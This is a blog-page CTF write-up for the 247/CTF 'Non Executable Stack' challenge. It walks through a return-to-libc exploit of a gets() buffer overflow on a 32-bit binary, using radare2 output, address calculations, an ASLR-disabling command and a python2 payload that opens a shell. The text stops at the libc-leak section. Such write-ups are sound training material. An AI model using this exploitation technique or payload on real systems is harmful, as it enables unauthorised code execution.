<!DOCTYPE html><html lang="en-us" >


<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  
  
  
    <meta name="generator" content="Wowchemy 5.5.0 for Hugo" />
  

  
  










  







  
  
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  

  
  
  
    
      
      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media="print" onload="this.media='all'">
    
  

  
  
  
  
  
    
    
    
  
  

  <meta name="author" content="Daniel Uroz" />

  
  
  
    
  
  <meta name="description" content="We&#39;ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we&#39;ll use the Python library pwntools to speed up exploit development." />

  
  <link rel="alternate" hreflang="en-us" href="https://duroz.github.io/post/247ctf-pwn-non-executable-stack/" />

  
  
  
    <meta name="theme-color" content="#1565c0" />
  

  
  

  

  <link rel="stylesheet" href="/css/vendor-bundle.min.c7b8d9abd591ba2253ea42747e3ac3f5.css" media="print" onload="this.media='all'">

  
  
  
    
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha512-W0xM4mr6dEP9nREo7Z9z+9X70wytKvMGeDsj7ps2+xg5QPrEBXC8tAW1IFnzjR6eoJ90JmCnFzerQJTLzIEHjA==" crossorigin="anonymous" media="print" onload="this.media='all'">
    

    
    
    
    
      
      
    
    
    

    
    
    
      
    
    
      
      
        
          <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.2.1/build/styles/github.min.css" crossorigin="anonymous" title="hl-light" media="print" onload="this.media='all'">
          <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.2.1/build/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" media="print" onload="this.media='all'" disabled>
        
      
    

    
    
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.min.css" integrity="" crossorigin="anonymous" media="print" onload="this.media='all'">
    

    

    
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
      
      

      
      
        
      

      
    
      
      

      
      

      
    
      
      

      
      

      
    
  

  
  
  
  
  
  <link rel="stylesheet" href="/css/wowchemy.95d53890c5839471cef2375b6c449b9f.css" />

  




<script async src="https://www.googletagmanager.com/gtag/js?id=G-XWYX3KP939"></script>
<script>
  window.dataLayer = window.dataLayer || [];

  function gtag() {
      dataLayer.push(arguments);
  }

  function trackOutboundLink(url, target) {
    gtag('event', 'click', {
         'event_category': 'outbound',
         'event_label': url,
         'transport_type': 'beacon',
         'event_callback': function () {
           if (target !== '_blank') {
             document.location = url;
           }
         }
    });
    console.debug("Outbound link clicked: " + url);
  }

  function onClickCallback(event) {
    if ((event.target.tagName !== 'A') || (event.target.host === window.location.host)) {
      return;
    }
    trackOutboundLink(event.target, event.target.getAttribute('target'));  
  }

  gtag('js', new Date());
  gtag('config', 'G-XWYX3KP939', {});
  gtag('set', {'cookie_flags': 'SameSite=None;Secure'});

  
  document.addEventListener('click', onClickCallback, false);
</script>


  


  


  




  
  
  

  

  
    <link rel="manifest" href="/manifest.webmanifest" />
  

  <link rel="icon" type="image/png" href="/media/icon_hu235ca53f37dee462d16f210e413d062e_29183_32x32_fill_lanczos_center_3.png" />
  <link rel="apple-touch-icon" type="image/png" href="/media/icon_hu235ca53f37dee462d16f210e413d062e_29183_180x180_fill_lanczos_center_3.png" />

  <link rel="canonical" href="https://duroz.github.io/post/247ctf-pwn-non-executable-stack/" />

  
  
  
  
  
  
  
  
    
    
  
  

  
  
    
    
  
  <meta property="twitter:card" content="summary" />
  
  <meta property="og:site_name" content="Daniel Uroz" />
  <meta property="og:url" content="https://duroz.github.io/post/247ctf-pwn-non-executable-stack/" />
  <meta property="og:title" content="247/CTF - pwn - Non Executable Stack | Daniel Uroz" />
  <meta property="og:description" content="We&#39;ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we&#39;ll use the Python library pwntools to speed up exploit development." /><meta property="og:image" content="https://duroz.github.io/media/icon_hu235ca53f37dee462d16f210e413d062e_29183_512x512_fill_lanczos_center_3.png" />
    <meta property="twitter:image" content="https://duroz.github.io/media/icon_hu235ca53f37dee462d16f210e413d062e_29183_512x512_fill_lanczos_center_3.png" /><meta property="og:locale" content="en-us" />
  
    
      <meta
        property="article:published_time"
        content="2020-06-08T00:00:00&#43;00:00"
      />
    
    <meta property="article:modified_time" content="2022-04-29T00:00:00&#43;00:00">
  

  


    






  




<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://duroz.github.io/post/247ctf-pwn-non-executable-stack/"
  },
  "headline": "247/CTF - pwn - Non Executable Stack",
  
  "datePublished": "2020-06-08T00:00:00Z",
  "dateModified": "2022-04-29T00:00:00Z",
  
  "author": {
    "@type": "Person",
    "name": "Daniel Uroz"
  },
  
  "publisher": {
    "@type": "Organization",
    "name": "Daniel Uroz",
    "logo": {
      "@type": "ImageObject",
      "url": "https://duroz.github.io/media/icon_hu235ca53f37dee462d16f210e413d062e_29183_192x192_fill_lanczos_center_3.png"
    }
  },
  "description": "We'll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we'll use the Python library pwntools to speed up exploit development."
}
</script>

  

  

  

  





  <title>247/CTF - pwn - Non Executable Stack | Daniel Uroz</title>
</head>


<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="page-wrapper   " data-wc-page-id="9efbb0799384c0a7f0727e7c22bc03bc" >

  
  
  
  
  
  
  
  
  
  <script src="/js/wowchemy-init.min.2ed908358299dd7ab553faae685c746c.js"></script>

  


<aside class="search-modal" id="search">
  <div class="container">
    <section class="search-header">

      <div class="row no-gutters justify-content-between mb-3">
        <div class="col-6">
          <h1>Search</h1>
        </div>
        <div class="col-6 col-search-close">
          <a class="js-search" href="#" aria-label="Close"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
        </div>
      </div>

      <div id="search-box">
        
        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
        autocomplete="off" autocorrect="off" spellcheck="false" type="search" class="form-control"
        aria-label="Search...">
        
      </div>

      
      

      

    </section>
    <section class="section-search-results">

      <div id="search-hits">
        
      </div>

    </section>
  </div>
</aside>



  <div class="page-header">
    












<header class="header--fixed">
  <nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
    <div class="container-xl">

      
      <div class="d-none d-lg-inline-flex">
        <a class="navbar-brand" href="/">Daniel Uroz</a>
      </div>
      

      
      <button type="button" class="navbar-toggler" data-toggle="collapse"
              data-target="#navbar-content" aria-controls="navbar-content" aria-expanded="false" aria-label="Toggle navigation">
      <span><i class="fas fa-bars"></i></span>
      </button>
      

      
      <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
        <a class="navbar-brand" href="/">Daniel Uroz</a>
      </div>
      

      
      
      <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">

        
        <ul class="navbar-nav d-md-inline-flex">
          

          

          
          
          
            
          

          

          
          
          
          

          
            
              
              
            
            
              
              
              
                
              
              
            
          

          <li class="nav-item">
            <a class="nav-link " href="/#about"><span>Home</span></a>
          </li>

          
          

          

          
          
          
            
          

          

          
          
          
          

          
            
              
              
            
            
              
              
              
                
              
              
            
          

          <li class="nav-item">
            <a class="nav-link " href="/#publications"><span>Publications</span></a>
          </li>

          
          

          

          
          
          
            
          

          

          
          
          
          

          
            
              
              
            
            
              
              
              
                
              
              
            
          

          <li class="nav-item">
            <a class="nav-link " href="/#posts"><span>Posts</span></a>
          </li>

          
          

          

          
          
          
            
          

          

          
          
          
          

          
            
              
              
            
            
              
              
              
                
              
              
            
          

          <li class="nav-item">
            <a class="nav-link " href="/#contact"><span>Contact</span></a>
          </li>

          
          

        

          
        </ul>
      </div>

      <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">

        
        
          
        

        
        
        <li class="nav-item">
          <a class="nav-link js-search" href="#" aria-label="Search"><i class="fas fa-search" aria-hidden="true"></i></a>
        </li>
        

        
        
        
        <li class="nav-item dropdown theme-dropdown">
          <a href="#" class="nav-link" data-toggle="dropdown" aria-haspopup="true" aria-label="Display preferences">
            <i class="fas fa-moon" aria-hidden="true"></i>
          </a>
          <div class="dropdown-menu">
            <a href="#" class="dropdown-item js-set-theme-light">
              <span>Light</span>
            </a>
            <a href="#" class="dropdown-item js-set-theme-dark">
              <span>Dark</span>
            </a>
            <a href="#" class="dropdown-item js-set-theme-auto">
              <span>Automatic</span>
            </a>
          </div>
        </li>
        

        
        

      </ul>

    </div>
  </nav>
</header>


  </div>

  <div class="page-body">
    
    
    

    <article class="article">

  












  

  
  
  
<div class="article-container pt-3">
  <h1>247/CTF - pwn - Non Executable Stack</h1>

  

  
    


<div class="article-metadata">

  
  
  
  
  <div>
    

  <span class="author-highlighted">
      Daniel Uroz</span>
  </div>
  
  

  
  <span class="article-date">
    
    
      
          Last updated on
      
    
    Apr 29, 2022
  </span>
  

  

  
  <span class="middot-divider"></span>
  <span class="article-reading-time">
    12 min read
  </span>
  

  
  
  
  

  
  
  <span class="middot-divider"></span>
  <span class="article-categories">
    <i class="fas fa-folder mr-1"></i><a href="/category/ctf/">CTF</a></span>
  

</div>

    





  
</div>



  <div class="article-container">

    <div class="article-style">
      <p>In this post, we&rsquo;ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non executable. We firstly detail how to manually exploit the binary locally and, after that, in the remote server. At the end, we&rsquo;ll use the Python library <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools</a> to speed up exploit development.</p>
<h2 id="challenge">Challenge</h2>
<p>This time, <a href="https://247ctf.com/" target="_blank" rel="noopener">247/CTF</a> give us a binary called <code>non_executable_stack</code> with the following description:</p>
<blockquote>
<p>There are no hidden flag functions in this binary. Can you make your own without executing from the stack?</p>
</blockquote>
<p>And here is an example of execution flow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./non_executable_stack 
</span></span><span class="line"><span class="cl">Enter the secret password:
</span></span><span class="line"><span class="cl">kk
</span></span><span class="line"><span class="cl">Incorrect secret password!
</span></span></code></pre></div><p>It&rsquo;s a ELF 32-bit as previous pwn challenges, but this time with <a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="noopener">NX bit</a> enable to make stack segment (and any other) writable but not executable:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ checksec non_executable_stack
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/urzu/247ctf/pwn/non_executable_stack&#39;</span>
</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</span></span></code></pre></div><p>This <code>checksec</code> version is the one coming with pwntools (you can install it with <code>python3 -m pip install pwntools</code>), there is also a <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener">Bash script</a> with the same functionality.</p>
<h2 id="background">Background</h2>
<p>If we analyze the binary, we can quickly spot the use of <code>gets</code> function to retrieve the password, so we can overflow the buffer due to no outbounds checking of the function:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">$ r2 non_executable_stack 
-- Virtual machines are great, but you lose the ability to kick the hardware.
[0x080483c0]&gt; aa
[x] Analyze all flags starting with sym. and entry0 (aa)                   
[0x080483c0]&gt; s sym.chall 
[0x080484d6]&gt; pdf
            ; CALL XREF from main @ 0x804857f
┌ 103: sym.chall ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_4h @ ebp-0x4
│           0x080484d6      55             push ebp
│           0x080484d7      89e5           mov ebp, esp
│           0x080484d9      53             push ebx
│           0x080484da      83ec24         sub esp, 0x24
[... redacted ...]
│           0x080484eb      8d45d8         lea eax, [var_28h]
│           0x080484ee      50             push eax
│           0x080484ef      e88cfeffff     call sym.imp.gets           ; char *gets(char *s) &lt;--- buffer overflow
[... redacted ...]
│      │    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]
│      │    0x0804852e      50             push eax
│      │    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x08048534      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.chall @ 0x8048523
│      └──&gt; 0x08048537      90             nop
│           0x08048538      8b5dfc         mov ebx, dword [var_4h]
│           0x0804853b      c9             leave
└           0x0804853c      c3             ret
[0x080484d6]&gt;
</code></pre><p>This problem is that, whereas in previous challenges we could execute our payload directly into the stack, this time NX bit is preventing us to do so. Still, we can overwrite the return based stored in the stack to control the program flow, so why don&rsquo;t use the code already residing in executable segments to our purpose? This is the main idea behind <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener">Return-to-libc attack</a> and <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">Return-oriented programming</a>.</p>
<h3 id="return-to-libc">Return-to-libc</h3>
<p>This attack relies of using code marked as executable contained in <code>libc</code> shared library. <code>libc</code> provides a runtime environment to C programs, so it usually loaded into the memory of most processes. In this binary, we can see that it will effectively be loaded thanks to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ldd non_executable_stack 
</span></span><span class="line"><span class="cl">linux-gate.so.1 <span class="o">(</span>0xf7fd2000<span class="o">)</span>
</span></span><span class="line"><span class="cl">libc.so.6 <span class="o">=</span>&gt; /lib32/libc.so.6 <span class="o">(</span>0xf7dd4000<span class="o">)</span>
</span></span><span class="line"><span class="cl">/lib/ld-linux.so.2 <span class="o">(</span>0xf7fd4000<span class="o">)</span>
</span></span></code></pre></div><p><code>libc</code> provides a lot of functions like <code>printf</code>, <code>scanf</code>, <code>fopen</code> and so on. Thus, if we can execute <code>system</code> function (which execute a shell command) with <code>/bin/sh</code> parameter, we&rsquo;ll be able to prompt an interactive shell.</p>
<h2 id="local-exploit">Local exploit</h2>
<p>We&rsquo;re going to develop a local version of the exploit and, in order to make it easier, we&rsquo;re going to deactivate <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener">ASLR protection</a> of our system:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="m">0</span> <span class="p">|</span> sudo tee /proc/sys/kernel/randomize_va_space
</span></span><span class="line"><span class="cl"><span class="m">0</span>
</span></span></code></pre></div><p>Firstly, we can obtain the necessary padding to overwrite the return address placing a breakpoint just before the <code>ret</code> instruction (<code>0x0804853c</code> in the code above) and seeing where is our input:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ r2 -d non_executable_stack
</span></span><span class="line"><span class="cl">Process with PID <span class="m">2381</span> started...
</span></span><span class="line"><span class="cl"><span class="o">=</span> attach <span class="m">2381</span> <span class="m">2381</span>
</span></span><span class="line"><span class="cl">bin.baddr 0x08048000
</span></span><span class="line"><span class="cl">Using 0x8048000
</span></span><span class="line"><span class="cl">asm.bits <span class="m">32</span>
</span></span><span class="line"><span class="cl">glibc.fc_offset <span class="o">=</span> 0x00148
</span></span><span class="line"><span class="cl">    -- Most likely your core dump fell into a blackhole, can<span class="err">&#39;</span>t see it.
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7fd50b0<span class="o">]</span>&gt; aa
</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7fd50b0<span class="o">]</span>&gt; db 0x0804853c
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7fd50b0<span class="o">]</span>&gt; dc
</span></span><span class="line"><span class="cl">Enter the secret password:
</span></span><span class="line"><span class="cl">kk
</span></span><span class="line"><span class="cl">Incorrect secret password!
</span></span><span class="line"><span class="cl">hit breakpoint at: 804853c
</span></span><span class="line"><span class="cl"><span class="o">[</span>0x0804853c<span class="o">]</span>&gt; px -0x2c @ esp
</span></span><span class="line"><span class="cl">- offset -   <span class="m">0</span> <span class="m">1</span>  <span class="m">2</span> <span class="m">3</span>  <span class="m">4</span> <span class="m">5</span>  <span class="m">6</span> <span class="m">7</span>  <span class="m">8</span> <span class="m">9</span>  A B  C D  E F  0123456789ABCDEF
</span></span><span class="line"><span class="cl">0xffffd1d0  6b6b 00ff <span class="m">9096</span> fef7 90f8 faf7 00a0 <span class="m">0408</span>  kk..............
</span></span><span class="line"><span class="cl">0xffffd1e0  00e0 faf7 00e0 faf7 08d2 ffff 7c85 <span class="m">0408</span>  ............<span class="p">|</span>...
</span></span><span class="line"><span class="cl">0xffffd1f0  <span class="m">5886</span> <span class="m">0408</span> 00a0 <span class="m">0408</span> 08d2 ffff            X...........
</span></span><span class="line"><span class="cl"><span class="o">[</span>0x0804853c<span class="o">]</span>&gt;
</span></span></code></pre></div><p>Our input starts <code>0x2c</code> before, so this is the amount of padding we need to provide and, then, the return address of the function we want to execute (<code>system</code> in this case). In addition, thanks to deactivating ASLR, <code>libc</code> will be loaded in the same base address during multiple executions (<code>0xf7dd4000</code> in the example):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0x0804853c<span class="o">]</span>&gt; dmm
</span></span><span class="line"><span class="cl">0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack
</span></span><span class="line"><span class="cl">0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so
</span></span><span class="line"><span class="cl">0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so
</span></span><span class="line"><span class="cl"><span class="o">[</span>0x0804853c<span class="o">]</span>&gt; ood
</span></span><span class="line"><span class="cl">PTRACE_CONT: No such process
</span></span><span class="line"><span class="cl">child received signal <span class="m">9</span>
</span></span><span class="line"><span class="cl">Process with PID <span class="m">2337</span> started...
</span></span><span class="line"><span class="cl"><span class="o">=</span> attach <span class="m">2337</span> <span class="m">2337</span>
</span></span><span class="line"><span class="cl">File dbg:///home/urzu/247ctf/pwn/non_executable_stack  reopened in read-write mode
</span></span><span class="line"><span class="cl"><span class="m">2337</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7fd50b0<span class="o">]</span>&gt; dc
</span></span><span class="line"><span class="cl">Enter the secret password:
</span></span><span class="line"><span class="cl">kk
</span></span><span class="line"><span class="cl">Incorrect secret password!
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7fd3069<span class="o">]</span>&gt; dmm
</span></span><span class="line"><span class="cl">0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack
</span></span><span class="line"><span class="cl">0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so
</span></span><span class="line"><span class="cl">0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7fd3069<span class="o">]</span>&gt;
</span></span></code></pre></div><p>So, our payload would look something like this (dummy address is explained a bit below):</p>
<pre tabindex="0"><code>[0x2c padding] + [system address] + [dummy address] + [/bin/sh address]
</code></pre><p>We can obtain the function RVA with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ rabin2 -s /usr/lib32/libc-2.28.so <span class="p">|</span> grep -w system
</span></span><span class="line"><span class="cl"><span class="m">1525</span>  0x0003e9e0 0x0003e9e0 WEAK   FUNC   <span class="m">55</span>        system
</span></span></code></pre></div><p>And the string offset (like a RVA) inside the library thanks to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ strings -t x /usr/lib32/libc-2.28.so <span class="p">|</span> grep /bin/sh
</span></span><span class="line"><span class="cl">17eaaa /bin/sh
</span></span></code></pre></div><p>As we already know that <code>libc</code> will be loaded in <code>0xf7dd4000</code> address, we can add those RVA to the base address to obtain the following payload:</p>
<pre tabindex="0"><code>[0x2c padding] + [0xf7e129e0] + [dummy address] + [0xf7f52aaa]
</code></pre><p>We can check that we effectively calculate the absolute address right with radare2:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0xf7f3b000<span class="o">]</span>&gt; dmi libc system
</span></span><span class="line"><span class="cl"><span class="m">257</span>   0x0012a2c0 0xf7efe2c0 GLOBAL FUNC   <span class="m">102</span>       svcerr_systemerr
</span></span><span class="line"><span class="cl"><span class="m">658</span>   0x0003e9e0 0xf7e129e0 GLOBAL FUNC   <span class="m">55</span>        __libc_system
</span></span><span class="line"><span class="cl"><span class="m">1525</span>  0x0003e9e0 0xf7e129e0 WEAK   FUNC   <span class="m">55</span>        system
</span></span><span class="line"><span class="cl"><span class="o">[</span>0xf7f3b000<span class="o">]</span>&gt; / /bin/sh
</span></span><span class="line"><span class="cl">Searching <span class="m">7</span> bytes in <span class="o">[</span>0xf7f3b000-0xf7fab000<span class="o">]</span>
</span></span><span class="line"><span class="cl">hits: <span class="m">1</span>
</span></span><span class="line"><span class="cl">0xf7f52aaa hit5_0 .b/strtod_l.c-c/bin/shexit 0canonica.
</span></span></code></pre></div><p>If we try our exploit, we can effectively obtain an interactive shell (the cat command is to maintain program stdin open and feed non_executable_stack with our commands):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="o">(</span>python2 -c <span class="s1">&#39;print(&#34;A&#34;*0x2c + &#34;\xe0\x29\xe1\xf7&#34; + &#34;A&#34;*4 + &#34;\xaa\x2a\xf5\xf7&#34;)&#39;</span> <span class="o">&amp;&amp;</span> cat<span class="o">)</span> <span class="p">|</span> ./non_executable_stack    
</span></span><span class="line"><span class="cl">Enter the secret password:
</span></span><span class="line"><span class="cl">Incorrect secret password!
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">urzu
</span></span></code></pre></div><h3 id="stack-frame">Stack frame</h3>
<p>So, why do we need a dummy address between our function call and the parameter? This is due how stack frame are constructed during function calls. We&rsquo;ll see it with a simple C example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hello World!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Okay, so if we analyze the compiled binary (<code>gcc -o test.out -m32 -no-pie test.c</code>) with radare2, well see that the parameter <code>&quot;Hello World!&quot;</code> is passed into the stack at line <code>0x08049184</code>:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">│           0x0804917e      8d9008e0ffff   lea edx, [eax - 0x1ff8]
│           0x08049184      52             push edx
│           0x08049185      89c3           mov ebx, eax
│           0x08049187      e8a4feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804918c      83c410         add esp, 0x10
</code></pre><p>After executing <code>0x08049184</code>, the stack looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="p">|</span>       ...       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>-----------------<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> @<span class="s2">&#34;Hello World!&#34;</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>-----------------<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>       ...       <span class="p">|</span>
</span></span></code></pre></div><p>Now, the function call at <code>0x08049187</code> will push the return address into the stack, so after the <code>puts</code>function ends doing its magic, the execution flow of our program will continue as nothing happened. This means that when <code>puts</code> starts to execute, it will see the stack as this:</p>
<pre tabindex="0"><code>|       ...       |
|-----------------|
|    0x0804918c   | &lt;--- return address of the caller
|-----------------|
| @&#34;Hello World!&#34; |
|-----------------|
|       ...       |
</code></pre><p>This return address is exactly our dummy address from our payload. So, in our payload, after the shell finished executing, the binary will probably crash as the program will change execution flow to <code>0x41414141</code> and very likely nothing valid is there. Therefore, we can change our dummy address with the address of exit function (calculated the same way that <code>system</code> function above) to produce a clean exit of the program:</p>
<pre tabindex="0"><code>[0x2c padding] + [0xf7e129e0] + [0xf7e03a60] + [0xf7f52aaa]
</code></pre><h2 id="remote-exploit">Remote exploit</h2>
<p>Well, now we know how to exploit the binary locally, but we need to consider two aspects to exploit it in the server:</p>
<ul>
<li>We need to assume that ASLR will be activated.</li>
<li>We don&rsquo;t know which version of <code>libc</code> is installed.</li>
</ul>
<p>In order to overcome the two limitations, we can use a <code>libc</code> function leakage.</p>
<h3 id="plt-and-got">PLT and GOT</h3>
<p>You can read more in detail in <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noopener">this blog</a>, but we only need to know the general idea. When a dynamic linked binary is using an external function (like <code>libc</code> <code>puts</code>), your code can&rsquo;t reference an absolute address of the library because this will change after each execution (due to ASLR) and it won&rsquo;t be portable (diferrent version of <code>libc</code> will have that function in different locations).</p>
<p>So, to overcome this issue, your code reference to another section within your binary, the Procedure Linkage Table (PLT). This section is responsible to either trigger linker resolution of target function (due to <a href="http://www.qnx.com/developers/docs/qnxcar2/index.jsp?topic=%2Fcom.qnx.doc.neutrino.prog%2Ftopic%2Fdevel_Lazy_binding.html" target="_blank" rel="noopener">lazy binding</a>) or jump to the target function if it was already resolved. The later is stored in the Global Offset Table (GOT) section, which is the actual table of offsets as filled in by the linker for external symbols.</p>
<p>You can see how <code>non_executable_stack</code> reference to the PLT in the code:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">[0x080484d6]&gt; pdf
[... redacted ...]
│      │    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]
│      │    0x0804852e      50             push eax
│      │    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
[... redacted ...]
</code></pre><p>If we see the content of that address, we can see that there is another jump:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">[0x080484d6]&gt; s sym.imp.puts
[0x08048390]&gt; pd 1
            ; CALL XREFS from sym.chall @ 0x804851b, 0x804852f
            ; CALL XREF from main @ 0x8048577
┌ 6: int sym.imp.puts (const char *s);
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└           0x08048390      ff2518a00408   jmp dword [reloc.puts]      ; 0x804a018
</code></pre><p>If we go to that address, we&rsquo;ll see that there is another reference to the binary itself, this is the PLT stub responsible to resolve the address of the external symbol, so puts haven&rsquo;t been invoked yet:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">[0x08048390]&gt; s reloc.puts
[0x0804a018]&gt; pd 1
            ; DATA XREF from sym.imp.puts @ 0x8048390
            ;-- reloc.puts:
            0x0804a018      .dword 0x08048396                          ; RELOC 32 puts
</code></pre><p>If we continue execution to force <code>puts</code> resolution, now we can see that now the GOT is pointing to the actual offset in memory:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">[0x0804a018]&gt; dc
Enter the secret password:
kk
Incorrect secret password!
[0xf7fd3069]&gt; s -
[0x0804a018]&gt; pd 1
            ; DATA XREF from sym.imp.puts @ 0x8048390
            ;-- reloc.puts:
            0x0804a018      .dword 0xf7e3b0a0                          ; RELOC 32 puts
[0x0804a018]&gt; dmi libc puts
[... redacted ...]
458   0x000690a0 0xf7e3b0a0 WEAK   FUNC   416       puts
[... redacted ...]
[0x0804a018]&gt;
</code></pre><h3 id="libc-leakage"><code>libc</code> leakage</h3>
<p>With all of this in mind, we can construct our payload the same way as before, but instead to reference the absolute address of the functions, we can use address of the PLT known functions. We can use this technique only because the binary isn&rsquo;t a <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener">Position Independent Executable (PIE)</a> and we can reference the absolute value of the PLT as we know where the binary will be mapped during execution (base address <code>0x8048000</code>).</p>
